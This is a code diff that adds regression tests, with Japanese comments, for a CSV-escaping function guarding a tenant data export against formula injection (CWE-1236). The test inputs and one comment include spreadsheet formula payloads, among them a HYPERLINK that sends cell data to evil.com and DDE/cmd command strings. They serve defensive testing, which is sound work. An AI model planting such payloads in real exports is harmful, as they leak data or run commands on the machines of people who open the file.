@@ -39,6 +39,7 @@ vi.mock('@/lib/db', () => ({
 
 import {
   exportTenantData,
+  csvEscape,
   USER_EXPORT_FIELDS,
   USER_PII_FIELDS,
 } from './data-export.service';
@@ -239,6 +240,59 @@ describe('exportTenantData', () => {
     expect(meta.tenantSlug).toBe('customer-a');
     expect(meta.exportedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
     expect(meta.counts).toBeDefined();
+  });
+});
+
+// 2026-05-13 (security/csv-formula-injection, B-4): CWE-1236 (CSV Formula Injection) 回帰テスト。
+//   Excel/Google Sheets が `=`/`+`/`-`/`@`/`\t`/`\r` で始まる値を **数式評価** する挙動を悪用し、
+//   admin/super が CSV を開いた瞬間に外部 URL を踏まされる攻撃を防ぐ。
+//   攻撃ペイロード例: `=HYPERLINK("https://evil.com/?"&A1, "click")` を displayName に入れる
+describe('csvEscape (B-4: Formula Injection 対策)', () => {
+  it('= で始まる値に `\'` を前置する (=HYPERLINK 等)', () => {
+    expect(csvEscape('=HYPERLINK("https://evil.com")')).toBe(
+      `"'=HYPERLINK(""https://evil.com"")"`,
+    );
+  });
+  it('@ で始まる値に `\'` を前置する (@SUM 等)', () => {
+    expect(csvEscape('@SUM(1+1)')).toBe(`'@SUM(1+1)`);
+  });
+  it('+ で始まる値に `\'` を前置する', () => {
+    expect(csvEscape('+1+1')).toBe(`'+1+1`);
+  });
+  it('- で始まる値に `\'` を前置する (-2+3 等)', () => {
+    expect(csvEscape('-2+3+cmd|"/c calc"!A1')).toBe(
+      `"'-2+3+cmd|""/c calc""!A1"`,
+    );
+  });
+  it('タブ (\\t) で始まる値に `\'` を前置する (DDE)', () => {
+    expect(csvEscape('\tDDE("cmd")')).toBe(`"'\tDDE(""cmd"")"`);
+  });
+  it('CR (\\r) で始まる値に `\'` を前置する', () => {
+    expect(csvEscape('\rDDE')).toBe(`"'\rDDE"`);
+  });
+  it('安全な文字列 (英数字始まり) は変更しない', () => {
+    expect(csvEscape('Hello World')).toBe('Hello World');
+    expect(csvEscape('Project A')).toBe('Project A');
+    expect(csvEscape('123 ABC')).toBe('123 ABC');
+  });
+  it('null / undefined は空文字', () => {
+    expect(csvEscape(null)).toBe('');
+    expect(csvEscape(undefined)).toBe('');
+  });
+  it('formula 文字を中途に含む値は対象外 (先頭のみが評価される)', () => {
+    expect(csvEscape('total = 5')).toBe('total = 5');
+    expect(csvEscape('a+b')).toBe('a+b');
+  });
+  it('RFC 4180 エスケープと Formula Injection 対策の併用', () => {
+    // 数式 + カンマ → `'` 前置 + " で囲む + " を "" にエスケープ
+    expect(csvEscape('=cmd("a,b")')).toBe(`"'=cmd(""a,b"")"`);
+  });
+  it('Date / オブジェクトも安全に処理', () => {
+    expect(csvEscape(new Date('2026-06-01T00:00:00Z'))).toBe(
+      '2026-06-01T00:00:00.000Z',
+    );
+    // JSON.stringify は `{` で始まるので formula 対象外
+    expect(csvEscape({ key: 'value' })).toBe(`"{""key"":""value""}"`);
   });
 });
 
